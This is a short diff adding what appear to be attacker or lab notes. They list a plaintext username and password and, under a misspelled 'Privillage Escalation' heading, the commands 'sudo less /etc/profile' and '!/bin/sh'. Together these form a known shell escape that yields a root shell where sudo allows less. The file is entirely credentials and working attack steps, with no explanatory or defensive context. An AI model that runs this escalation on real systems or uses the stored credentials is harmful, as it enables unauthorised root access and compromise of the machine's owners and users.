@@ -1,0 +1,6 @@
+username: jake
+password: 987654321
+
+Privillage Escalation: 
+sudo less /etc/profile
+!/bin/sh
